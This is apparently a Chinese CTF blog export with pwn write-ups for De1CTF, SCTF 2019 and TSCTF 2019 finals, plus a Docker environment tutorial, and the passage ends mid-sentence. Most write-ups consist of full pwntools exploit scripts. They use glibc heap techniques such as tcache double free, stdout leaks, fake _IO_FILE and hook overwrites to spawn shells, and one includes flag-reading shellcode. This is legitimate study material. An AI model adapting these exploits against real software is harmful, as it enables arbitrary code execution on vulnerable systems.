ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(index,size,content): p.recvuntil('choice: ') p.sendline('1') p.recvuntil('index: ') p.sendline(str(index)) p.recvuntil('size: ') p.sendline(str(size)) p.recvuntil('info: ') p.send(content)def delete(index): p.recvuntil('choice: ') p.sendline('3') p.recvuntil('index: ') p.sendline(str(index))def view(index): p.recvuntil('choice: ') p.sendline('2') p.recvuntil('index: ') p.sendline(str(index))new(0,0x520,'\x11'*0x30)new(1,0x100,'\x22'*0x30)delete(0)new(2,0x100,'\x00'*8)new(0,0x400,'\x11'*8)view(0)p.recvuntil('\x11'*8)libcbase = u64(p.recv(6).ljust(8,'\x00')) libcbase = libcbase-(0x7f8683ad4f68-0x7f8683710000)log.success('libcbase = '+hex(libcbase))libc.address = libcbasep.recvuntil('\x00'*2)heap_addr = u64(p.recv(6).ljust(8,'\x00')) - 0x70 - 0xa0log.success('heap_addr = '+hex(heap_addr))delete(0)delete(1)delete(2)target_value = heap_addr + 0x10target_addr = libc.address + 0x3c55a0top_chunk_addr = heap_addr + 0x200offset = (target_value) + (target_addr -0x10 - top_chunk_addr) + 0x10 log.success('target_addr = '+hex(target_addr))log.success('target_value'+hex(target_value))log.success('top_chunk_addr = '+hex(top_chunk_addr))log.success('offset = '+hex(offset))vtable = p64(heap_addr + 0xf0 + 1)fake_file = '/bin/sh\x00'+p64(0)*4+p64(1)fake_file += p64(0)*14 + vtable + p64(0)*3 + p64(0xffffffffffffffff)fake_file = fake_file.ljust(0xd8,'\x00')fake_file += vtable + p64(0)*3 + p64(libc.symbols['system'])*4new(0,0x200,'\x00'+fake_file+p64(0)*27+'\x00'*7+p64(offset))new(1,libcbase+(0x7f59e6fb3b20-0x7f59e6bef000)+88+1,'\x11')new(2,target_addr -0x10 - top_chunk_addr,'\x11')#gdb.attach(p)p.recvuntil('choice:')p.sendline('4')p.interactive() Mimic_note一道拟态防御的题，先鸽了。 Race内核题。。。先占个坑 babyrust是cve的变种，to do。。。。。。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>De1CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker初识]]></title>
    <url>%2F2019%2F08%2F08%2Fdocker%E5%88%9D%E8%AF%86%2F</url>
    <content type="text"><![CDATA[说起来蛮丢人的，一直看大佬们做题都是用docker，而自己还一直用笨重的虚拟机，但是虚拟机又用习惯了，一直懒得整docker，直到一次线下赛19.04的ubuntu崩了，让我下定了要换docker的决心，昨天简单整了一下，在此记录一下。 docker在pwn里使用的方面我了解到的暂时主要有两个： 搭好环境，安好工具，用来做题：先从dockerhub上pull一个普通的ubuntu19.04，再run起来： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556$ docker pull ubuntu:19.04$ docker run -i -t --name create_env ubuntu:19.04 bash'''docker run：启动containerubuntu:19.04：你想要启动的image:tag-t：进入终端-i：获得一个交互式的连接，通过获取container的输入bash：在container中启动一个bash shellUsage: docker run [OPTIONS] IMAGE [COMMAND] [ARG...] 02. 03. -d, --detach=false 指定容器运行于前台还是后台，默认为false 04. -i, --interactive=false 打开STDIN，用于控制台交互，常与-t一起使用05. -t, --tty=false 分配tty设备，该可以支持终端登录，默认为false，常与-i一起使用 06. -u, --user="" 指定容器的用户 07. -a, --attach=[] 登录容器（必须是以docker run -d启动的容器） 08. -w, --workdir="" 指定容器的工作目录 09. -c, --cpu-shares=0 设置容器CPU权重，在CPU共享场景使用 10. -e, --env=[] 指定环境变量，容器中可以使用该环境变量 11. -m, --memory="" 指定容器的内存上限 12. -P, --publish-all=false 指定容器暴露的端口 13. -p, --publish=[] 指定容器暴露的端口 14. -h, --hostname="" 指定容器的主机名 15. -v, --volume=[] 给容器挂载存储卷，挂载到容器的某个目录 16. --volumes-from=[] 给容器挂载其他容器上的卷，挂载到容器的某个目录 17. --cap-add=[] 添加权限，权限清单详见：http://linux.die.net/man/7/capabilities 18. --cap-drop=[] 删除权限，权限清单详见：http://linux.die.net/man/7/capabilities 19. --cidfile="" 运行容器后，在指定文件中写入容器PID值，一种典型的监控系统用法 20. --cpuset="" 设置容器可以使用哪些CPU，此参数可以用来容器独占CPU 21. --device=[] 添加主机设备给容器，相当于设备直通 22. --dns=[] 指定容器的dns服务器 23. --dns-search=[] 指定容器的dns搜索域名，写入到容器的/etc/resolv.conf文件 24. --entrypoint="" 覆盖image的入口点 25. --env-file=[] 指定环境变量文件，文件格式为每行一个环境变量 26. --expose=[] 指定容器暴露的端口，即修改镜像的暴露端口 27. --link=[] 指定容器间的关联，使用其他容器的IP、env等信息 28. --lxc-conf=[] 指定容器的配置文件，只有在指定--exec-driver=lxc时使用 29. --name="" 指定容器名字，后续可以通过名字进行容器管理，links特性需要使用名字 30. --net="bridge" 容器网络设置: 31. bridge 使用docker daemon指定的网桥 32. host //容器使用主机的网络 33. container:NAME_or_ID &gt;//使用其他容器的网路，共享IP和PORT等网络资源 34. none 容器使用自己的网络（类似--net=bridge），但是不进行配置 35. --privileged=false 指定容器是否为特权容器，特权容器拥有所有的capabilities 36. --restart="no" 指定容器停止后的重启策略: 37. no：容器退出时不重启 38. on-failure：容器故障退出（返回值非零）时重启 39. always：容器退出时总是重启 40. --rm=false 指定容器停止后自动删除容器(不支持以docker run -d启动的容器) 41. --sig-proxy=true 设置由代理接受并处理信号，但是SIGCHLD、SIGSTOP和SIGKILL不能被代理 ''' 之后我们就进入了ubuntu19.04的docker内部，我们可以在这里装做题需要用到的工具。 当然我们需要先换源，我用的是163的源，换源的命令行： 12345678cd /etc/aptcp sources.list sources.list.bak #备份apt-get updateapt-get install vim #安装编辑器apt-get install apt-transport-https #换源之后采用https协议，需要安装该软件才行echo '' &gt; sources.list #清空原有的数据vim sources.list #放入新源数据apt-get update #更新 换源之后就可以直接运行工具安装脚本： 123456789101112131415161718#安装pwntools库apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialpip install pwntools#安装pwngdb和pedaapt-get install gdbgit clone https://github.com/longld/peda.git ~/pedaecho "source ~/peda/peda.py"&gt;&gt; ~/.gdbinitcd ~/git clone https://github.com/scwuaptx/Pwngdb.gitcp ~/Pwngdb/.gdbinit ~/#安装one_gadgetapt-get install rubyapt-get install gemgem install one_gadget#安装tmuxapt-get install tmux#安装ROPgadgetpip install ropgadget 正常情况下是可以一键运行脚本安装完成的，但是我在安装18.10时，在装python-dev时遇到缺失依赖的情况，解决方法如下： 123apt-get install aptitude aptitude install python-dev#之后的判断是：n y y ，不要一直无脑按回车 ( 之后可以继续正常安装。 还有需要说明的一点是，tmux算是必须要装的东西，因为docker无法弹出shell，所以gdb.attach的弹出的shell必须在当前shell分屏，需要在exp前端加上下面这行代码： 1context.terminal = ['tmux','splitw','-h'] 还有一点是在docker里进入tmux后，按CTRL+B+:，底端会出现命令行，输入set -g mouse on，这样调试页面就可以上下滑动了，不然屏幕无法滚动，调试会很不方便。 安装完成之后就可以将我们的docker提交 (commit)为我们自己的镜像 (image)： 先CTRL+D停止docker，然后用： 1docker ps -a #查看已经停止运行的docker容器 获取CONTAINER ID，然后用commit命令将容器提交为镜像： 123456docker commit -m "xxxxxx" CONTAINER ID xiaoxiaorenwu/ctf-pwn:19.04#-m为提交时的描述#xiaoxiaorenwu最好为你在dockerhub上的用户名#ctf-pwn为仓库名#19.04为tag#CONTAINER ID就是上面获取的那个 然后再docker images，我们就可以看到自己打包的镜像了。 然后我们可以将这个镜像放到dockerhub上去： 12docker logindocker push xiaoxiaorenwu/ctf-pwn:19.04 因为网速问题也可以放到阿里云的docker托管仓库，但我感觉其实都一样。。。。 想改image的名字和tag时： 1docker tag IMAGEID(镜像id) REPOSITORY:TAG（仓库：标签） 之后我们可以重新运行docker，并设置本机和docker共享的文件夹： 1docker run -i -t --privileged -v ~/pwn（本机文件夹）:/home/ctf-pwn（docker文件夹） xiaoxiaorenwu/ctf-pwn:19.04 bash 然后当我们退出时可以CTRL+D，再次启动时可以运行脚本： 12docker container start CONTAINER IDdocker exec -i -t CONTAINER ID bash 然后就可以开始调试了。。。。 这些都是基本操作，为了做题已经足够。。。真正的掌握还差太远。 打包好作为出题的环境：之前的方法：socat tcp-l:9999,fork exec:./pwn ，这种方法很不安全。 现在docker+xinted比较普遍，看雪上有文章写的比较详细：传送门1号 还有一篇博客是同时在一个docker里部署多个题目：传送门2号 docker-compose还没细看。。。。先写这么点，日后再补充。。复盘计划为重QAQ 最后附上我的docker(建议使用国内阿里云的)： 123docker pull xiaoxiaorenwu/ctf-pwn:18.04docker pull xiaoxiaorenwu/ctf-pwn:18.10docker pull xiaoxiaorenwu/ctf-pwn:19.04 1234sudo docker pull registry.cn-hangzhou.aliyuncs.com/xiaoxiaorenwu/ctf-pwn:18.04sudo docker pull registry.cn-hangzhou.aliyuncs.com/xiaoxiaorenwu/ctf-pwn:18.10sudo docker pull registry.cn-hangzhou.aliyuncs.com/xiaoxiaorenwu/ctf-pwn:19.04sudo docker pull registry.cn-hangzhou.aliyuncs.com/xiaoxiaorenwu/ctf-pwn:19.10 https://cr.console.aliyun.com/repository/cn-hangzhou/xiaoxiaorenwu/ctf-pwn/details]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019SCTF]]></title>
    <url>%2F2019%2F08%2F07%2F2019SCTF%2F</url>
    <content type="text"><![CDATA[这场比赛当时因为快到期末考试了，没有打，现在复盘一下，貌似大部分都是技巧题。 one_heap中高端技巧题，一般限制次数的tcache都比较有趣就像解密一样hhhh，这题也是。 只有一个chunk位，限制了15次malloc，4次free，环境是2.27。 值得注意的一点是不会有\n这个干扰字节，也就是说你向chunk里只输入一个\n，就等于输入了空。有了这个特点可以把我们的double free变成一个无限循环圈。 leak利用new，delete，delete，new，new，new的套路，再一次delete时，chunk就会放入unsortedbin里，获取到了main_arena+88的地址。但是因为我们有一个无限循环圈，所以此时tcache[0x90]里仍然是一个循环圈并且和unsortedbin里的chunk是一样的。然后分配一个小chunk对fd进行partial overwrite，然后分到_IO_2_1_stdout去泄露。 劫持执行流为了泄露我们已经用了三次delete，还剩随后一次，一次delete想完成一次普通的劫持是不太可能的，所以肯定有奇妙的方法，我们再仔细想，一次delete能干啥呢？一次delete似乎只能把一个chunk放进tcache[]里，但是我们想去malloc_hook的话，必须篡改一个已经在tcache里的chunk的fd为malloc_hook，但是人人都会的double free肯定是想都不用想的，所以我们只能篡改unsortedbin里的chunk的size，然后再new一个size比原先大的chunk的时候就等效于产生了溢出，利用这个假溢出来更改一个已经放进tacahe里的chunk的fd为malloc_hook。最后进行realloc_hook微调，get shell !!` 真的感觉有时做tcache像解密一样。。。特别是限制次数的那种。 exp如下1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#coding:utf-8from pwn import *path = './one_heap'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64')context.terminal=['tmux','splitw','-h']#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size,content): p.recvuntil('choice:') p.sendline('1') p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('content:') p.send(content)def delete(): p.recvuntil('choice:') p.sendline('2')def mypwn(): new(0x7f,'\x11'*8+'\n') delete() delete() new(0x7f,'\n') new(0x7f,'\n') new(0x7f,'\n') new(0x30,p64(0)*4+p64(0x90)+'\x20'+'\n') delete() new(0x7f,'\n') delete() new(0x20,'\x60\x77\n') new(0x7f,p64(0)*4+p64(0)+p64(0x91)+'\n') new(0x7f,p64(0xfbad1800)+p64(0)*3+'\x00'+'\n') p.recv(8) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f7e447088b0-0x00007f7e4431b000) log.success('libcbase = '+hex(libcbase)) new(0x68, p64(0) * 11 + p64(0x41) + p64(libcbase+libc.sym['__realloc_hook'])) one_gadget = [0x4f2c5,0x4f322,0x10a38c] new(0x30,'\n') new(0x30,p64(libcbase+one_gadget[2])+p64(libcbase+libc.sym['__libc_realloc']+4)+'\n') new(0x20,'xiaoxiaorenwu'+'\n') if attach == 1: gdb.attach(p)while True: try: mypwn() break except: p.close() p = process('./one_heap')p.interactive() 之后才看到原来上面这种解法是非预期。。。预期解太狗血了。。。爆破1/4096，爆一下午能出么。。。 预期解利用两次delete来double free，之后想向stdout去分配chunk，但是因为heap地址和proc地址中间有三到四个字节不同，所以要爆破很久，之后就是再double free。 我不造这个预期解出的有什么意义。。 exp如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#coding:utf-8from pwn import*context.log_level = "debug"p = process("./one_heap")a = ELF("./libc-2.27.so")context.terminal = ['tmux','splitw','-h']#p = remote("47.104.89.129",10001)#gdb.attach(p)def new(size,content): p.recvuntil("Your choice:") p.sendline("1") p.recvuntil("Input the size:") p.sendline(str(size)) p.recvuntil("Input the content:") p.sendline(content)def remove(): p.recvuntil("Your choice:") p.sendline("2")def new0(size,content): p.recvuntil("Your choice:") p.sendline("1") p.recvuntil("Input the size:") p.sendline(str(size)) p.recvuntil("Input the content:") p.send(content)new(0x60,"aaa")remove()remove()new(0x60,'\x20\x60') #想分到stdout上去 stdout_addr = proc_addr + 0x202020#gdb.attach(p)new(0x60,'')raw_input()new(0x60,'')pay = p64(0xfbad1880) + p64(0)*3 + "x00"new(0x60,pay)libc_addr = u64(p.recvuntil("x7f")[8:8+6].ljust(8,"x00"))-0x3ed8b0print hex(libc_addr)malloc_hook = a.symbols["__malloc_hook"]+libc_addrrelloc_hook = a.symbols["__realloc_hook"]+libc_addrprint hex(malloc_hook)one = 0x4f2c5+libc_addrprint onenew(0x50,"a")remove()remove()new(0x50,p64(relloc_hook))new(0x50,"peanuts")new(0x50,p64(one)+p64(libc_addr+a.sym['realloc']+0xe))print hex(one)new(0x30,"b")p.interactive() two_heap考了两个主要的点，一个__printf_chk利用%a泄露libc，一个点是malloc的size，0x0，0x8，0x10，0x18申请出的chunk都是0x20来绕过题目里的size check。妈的，倒是这个环境问题搞得我很头大。。。ld.so最后找学长要的。。 第一个点在2018BCTF和2018HCTF里都出现了，反正就是相互抄呗。。。（ 逃。 传送门一号（泄露的原理） 传送门二号 我这里跟了一下： 先压整数寄存器： 然后检测al，al为0所以进行了跳转： 看一下未跳转处的代码指令，压入8个浮点数寄存器： 看一下此时的栈布局，我们泄露的脏数据应该就是画出的那一部分： 结果： exp如下1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['tmux','splitw','-h']def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\x00')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)elf = change_ld('./two_heap','./ld-2.26.so')p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.26.so'&#125;)def new(size,content): p.recvuntil('Your choice:') p.sendline('1') p.recvuntil('Input the size:') p.sendline(str(size)) p.recvuntil('Input the note:\n') p.send(content)def delete(index): p.recvuntil('Your choice:') p.sendline('2') p.recvuntil('Input the index:\n') p.sendline(str(index))libc = ELF('./libc-2.26.so') p.recvuntil('Welcome to SCTF:\n')p.sendline('%a%a%a%a%a')p.recvuntil('00x0.0')libcbase = '0x'+p.recv(11)+'0'libcbase = int(libcbase,16)libcbase = libcbase - (0x7f817db77720-0x7f817d9c8000)log.success('libcbase = '+hex(libcbase))p.recvuntil('Your choice:')p.sendline('1')p.recvuntil('Input the size:')p.sendline('0')delete(0)delete(0)new(8,p64(libcbase+libc.sym['__free_hook']))new(0x10,'\n')new(0x18,p64(libcbase+libc.sym['system'])+'\n')new(0x20,'/bin/sh\x00\n') #4delete(4)p.interactive() easy_heap这题和2019TSCTF的ym学长出的babyheap重了。。。而且预期解和我当时的解还不一样貌似。。。 TSCTF原本的解第二阶段的fastbin_attack即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#coding:utf-8from pwn import *path = './easy_heap'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def delete(index): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index))def fill(index,content): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: ') p.send(content)def mypwn(): new(0x88) #0 new(0x68) #1 new(0x68) #2 new(0xf8) #3 new(0x28) #4 fill(2,p64(0)*12+p64(0x170)+'\n') delete(0) delete(3) new(0x68) #0 fill(0,'\xdd\x15\n') delete(1) delete(2) new(0xa0) #1 fill(1,p64(0)*17+p64(0x71)+'\x00\n') new(0x68) #2 new(0x68) #3 new(0x68) #5 fill(5,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00'+'\n') p.recv(0x40) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f015afd1600-0x7f015ac0c000) log.success('libcbase = '+hex(libcbase)) delete(0) delete(2) delete(3) new(0x68) #0 fill(0,p64(libcbase+(0x7f015afd0b05-0x7f015ac0c000))+'\n') new(0x68) #2 new(0x68) #3 new(0x68) #6 fill(6,'\x00'*0xb+p64(0)*5+p64(0x7f)+p64(libcbase+(0x7f015afd0b40-0x7f015ac0c000))+'\n') new(0x68) #7 fill(7,p64(libcbase+(0x7f015afd0b40-0x7f015ac0c000))+p64(0)*4+p64(libcbase+libc.sym['__malloc_hook']-0x10)+'\n') new(0x140) #8 new(0x10) #9 one_gadget = [0x4526a,0x45216,0xf02a4,0xf1147] fill(9,p64(libcbase+one_gadget[2])+'\n') delete(9) if attach == 1: gdb.attach(p) p.interactive()while True: try: mypwn() break except: p.close() p = process(path) 因有了mmap地址而写的新解在mmap_addr上伪造_IO_FILE，然后改_IO_list_all为mmap_addr即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#coding:utf-8from pwn import *path = './easy_heap'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def delete(index): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index))def fill(index,content): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Content: ') p.send(content)def mypwn(): p.recvuntil('Mmap: ') mmap_addr = int(p.recv(12),16) log.success('mmap_addr = '+hex(mmap_addr)) new(0x88) #0 p.recvuntil('Address ') base_addr = int(p.recv(14),16) - 0x68 log.success('base_addr = '+hex(base_addr)) new(0x68) #1 new(0x68) #2 new(0xf8) #3 new(0x28) #4 fill(2,p64(0)*12+p64(0x170)+'\n') delete(0) delete(3) new(0x68) #0 fill(0,'\xdd\x15\n') delete(1) delete(2) new(0xa0) #1 fill(1,p64(0)*17+p64(0x71)+'\x00\n') new(0x68) #2 new(0x68) #3 new(0x68) #5 fill(5,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00'+'\n') p.recv(0x40) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f015afd1600-0x7f015ac0c000) log.success('libcbase = '+hex(libcbase)) delete(0) delete(2) delete(3) new(0x68) #0 fill(0,p64(base_addr+0xb5)+'\n') new(0x68) #2 new(0x68) #3 new(0x68) #6 fill(6,'\x00'*0xb+p64(0x200)+p64(mmap_addr)+p64(0x20)+p64(libcbase+libc.sym['_IO_list_all'])+'\n') vtable = p64(mmap_addr+0xe0) fake_file = '/bin/sh\x00'+p64(0)*4+p64(1) fake_file += p64(0)*14 + vtable + p64(0)*3 + p64(0xffffffffffffffff) fake_file = fake_file.ljust(0xd8,'\x00') fake_file += vtable + p64(0)*3 + p64(libcbase + libc.symbols['system'])*4 fill(7,fake_file+'\n') fill(8,p64(mmap_addr)+'\n') p.recvuntil('&gt;&gt; ') p.sendline('4') if attach == 1: gdb.attach(p) p.interactive()while True: try: mypwn() break except: p.close() p = process(path) 官方解Unlink加partial overwrite加house of orange： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127from pwn import *context.log_level = "debug"context.terminal = ["tmux","split",'-h']context.update(arch='amd64',os='linux')DEBUG = 1if DEBUG: p = process("./easy_heap") libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")else: p = remote("132.232.100.67",10004) libc = ELF("./libc.so.6")def add(size): p.recvuntil("&gt;&gt; ") p.sendline('1') p.recvuntil("Size: ") p.sendline(str(size)) p.recvuntil("Address ") heap_ptr = int(p.recvuntil("\n",drop=True),16) print hex(heap_ptr) return heap_ptrdef delete(idx): p.recvuntil("&gt;&gt; ") p.sendline('2') p.recvuntil("Index: ") p.sendline(str(idx))def edit(idx,data): p.recvuntil("&gt;&gt; ") p.sendline('3') p.recvuntil("Index: ") p.sendline(str(idx)) p.recvuntil("Content: ") p.send(data)code = """ xor rsi,rsi mov rax,SYS_open nop nop call here .string "./flag" here: pop rdi syscall mov rdi,rax mov rsi,rsp mov rdx,0x100 mov rax,SYS_read syscall mov rdi,1 mov rsi,rsp mov rdx,0x100 mov rax,SYS_write syscall mov rax,SYS_exit syscall """shellcode = asm(shellcraft.sh())p.recvuntil("Mmap: ")mmap_addr = int(p.recvuntil('\n',drop=True),16)print hex(mmap_addr)##unlinkheap_list = add(0xf8) - 0x8 #0add(0xf0) #1add(0x20) #2payload = p64(0) + p64(0xf0)payload += p64(heap_list+0x8-0x18) + p64(heap_list+0x8-0x10)payload = payload.ljust(0xf0,'\x00')payload += p64(0xf0)edit(0,payload)delete(1)##mmap_addr-&gt;shellcodepayload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)payload += p64(0x1000) + p64(mmap_addr)edit(0,payload+'\n')edit(1,shellcode+'\n')##unsorted bin size: 0x1c1-&gt;0x61add(0x20) #3payload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)payload += p64(0)*4 + p64(8) + '\x48' + '\n' #unsortedbin sizeedit(0,payload)edit(3,'\x61\x00'+'\n')##unsortedbin attack##bk -&gt; IO_list_all-0x10payload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)payload += p64(0)*4 + p64(8) + '\x58' + '\n' #unsortedbin bkedit(0,payload)edit(3,'\x10\x25'+'\n') #IO_list_all##fake vtablepayload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)payload += p64(0)*4 + p64(0x1000) + '\x60' + '\n'edit(0,payload)fake_vtable = (heap_list - 0x202060) + 0x202070payload = p64(2) + p64(3)payload = payload.ljust(0xb8,'\x00')payload += p64(fake_vtable)edit(3,payload+'\n')##payload = p64(0)*2 + p64(0xf8) + p64(heap_list-0x10)payload += p64(mmap_addr) * 10edit(0,payload+'\n')##triggergdb.attach(p)p.recvuntil("&gt;&gt; ")p.sendline('1')p.recvuntil("Size: ")p.sendline('1')p.interactive()]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>SCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019TSCTF_FINAL]]></title>
    <url>%2F2019%2F08%2F01%2F2019TSCTF_FINAL%2F</url>
    <content type="text"><![CDATA[6月份的2019TSCTF的线下赛应该是我打的第一次awd，第一次么，难免有些紧张，再加上只有我一个人打pwn（毕竟一个队伍就两个人。。。一人web一人pwn。。。最后开心自闭orz），整个比赛有点手忙脚乱，一直想复盘总结一下这两道题，17和ym学长出的题还是很有水平的，以及加上在这之后又打了两场线下，想在最后说一下我自己的一点心得经验。 cxk:环境：docker:18.04 程序分析和漏洞挖掘：这个程序逻辑比较复杂，当时在比赛时看呆了。。。完全迷在了程序里。。。脑子一片混沌，赛后复现才慢慢理清思路，收获也有不少。 其实有用的函数就五个，其他都是用来乱花迷人眼的。程序太长，懒得分析，自己看吧。。。 漏洞点： edit_letter功能里的strchr函数，他会把\x00也算作字符串的一部分，并且次数没有限制，我们就可以把\x00先把字节抹去，再更改之后的chunk的size位，进而进行chunk overlapping。 tcache本身自带的松散检查。 唉，其实这题主要考的是程序的分析能力，和看你能不能在短时间内找到突破点，而不是一直迷在程序的无用逻辑里。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123#coding:utf-8from pwn import *path = './cxk'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','splitw','-h'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def addav(av_number,des_size,content): p.recvuntil('Choice:') p.sendline('2') p.recvuntil('Choice:') p.sendline('1') p.recvuntil('av number:') p.sendline(str(av_number)) p.recvuntil('description:') p.sendline(str(des_size)) p.recvuntil('Description:') p.sendline(content)def addletter(av_number,reason_size,reason): p.recvuntil('Choice:') p.sendline('1') p.recvuntil('Choice:') p.sendline('1') p.recvuntil('av number:') p.sendline(str(av_number)) p.recvuntil('size of reason:') p.sendline(str(reason_size)) p.recvuntil('Reason:') p.send(reason)def editletter(av_number,old_chr,new_chr): p.recvuntil('Choice:') p.sendline('1') p.recvuntil('Choice:') p.sendline('3') p.recvuntil('statement you want to change:') p.sendline(str(av_number)) p.recvuntil('old character:') p.sendline(old_chr) p.recvuntil('new character:') p.sendline(new_chr)def revoke(av_number): p.recvuntil('Choice:') p.sendline('1') p.recvuntil('Choice:') p.sendline('4') p.recvuntil('you want to revoke:') p.sendline(str(av_number))def showletter(av_number): p.recvuntil('Choice:') p.sendline('1') p.recvuntil('Choice:') p.sendline('5') p.recvuntil('you want to see:') p.sendline(str(av_number))p.recvuntil('Please input your name:')p.sendline('xiaoxiaorenwu')#------------------get unsortedbin chunk and prepare for get shellfor i in range(20): addav(i,10,'xxrw')for i in range(8): addletter(i,68,'\x11'*0x67+'\n')addletter(8,18,'xxrw\n')addletter(9,18,'xxrw\n')for i in range(7): editletter(i,'\x00','\x11') editletter(i,'\x31','\xa1') revoke(i)revoke(8)revoke(9)editletter(7,'\x00','\x11')editletter(7,'\x31','\xa1')revoke(7)#------------------success--------------------------------------#------------------leak libc------------------------------------addletter(10,0x28,'\x11'*7+'\n')showletter(10)p.recvuntil('\x11'*7+'\x00')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7fdbef252d30-0x7fdbeee67000)log.success('libcbase = '+hex(libcbase))free_hook = libcbase + libc.sym['__free_hook']system_addr = libcbase + libc.sym['system']#------------------success--------------------------------------#------------------get shell------------------------------------for i in range(27): editletter(10,'\x00','\x11')for i in range(6): editletter(10,'\x00',p64(free_hook)[i])addletter(11,18,'\n')addletter(12,18,'/bin/sh\x00\n')addletter(13,18,p64(system_addr)+'\n')revoke(12)if attach == 1: gdb.attach(p)p.interactive() filesystem:环境：Ubuntu16.04 程序分析和漏洞挖掘：这题比cxk要好得多，起码代码量不是很大，我在比赛时也已经分析得差不多了，当时主要卡在unsortedbin_attack，先申请一个0x50的结构体chunk这个东西老是干扰我的正常思路，在加上比赛时本来心态就慌，导致思路很乱，再复盘一下。 程序功能自己分析吧，不难，都能看懂，懒得写了。。。。 漏洞点有两个： snprintf的返回值漏洞，其返回的是打印出的字符数，如果我们名字长度是0x20的话，更新时我们就可以填一个0x31长度的名字，正好溢出一个字节，改了size，造成进一步content溢出。 函数原型：int snprintf(char *str, size_t size, const char *format, …); size 的作用就是限制往str写入不超过size个字节(包括了结尾的’\0’)。 因为sprintf()函数如果成功的话，返回成功写入的字节数(字符数)，我就一直以为snprintf()函数也是如此，也就是snprintf()函数不会返回大于size的整数。 看下面一段手册内容： The functions snprintf() and vsnprintf() do not write more than size bytes (including the trailing ’\0’). If the output was truncated due to this limit then the return value is the number of 